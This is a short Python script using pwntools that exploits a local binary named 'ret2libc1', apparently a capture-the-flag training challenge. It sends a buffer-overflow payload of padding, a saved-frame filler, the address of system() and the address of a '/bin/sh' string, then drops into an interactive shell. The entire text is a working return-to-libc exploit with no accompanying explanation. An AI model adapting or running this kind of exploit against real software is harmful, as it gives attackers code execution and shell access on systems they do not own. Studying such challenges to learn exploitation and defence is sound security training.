from pwn import *

elf = ELF('ret2libc1')
io = process(elf.path)
#gdb.attach(io,"b * 0x08048689")
system_addr = 0x08048460
bin_sh_addr = 0x08048720
payload = b'a'*0x6c +b'bbbb' +p32(system_addr) + b'cccc' + p32(bin_sh_addr)
io.sendline(payload)
io.interactive()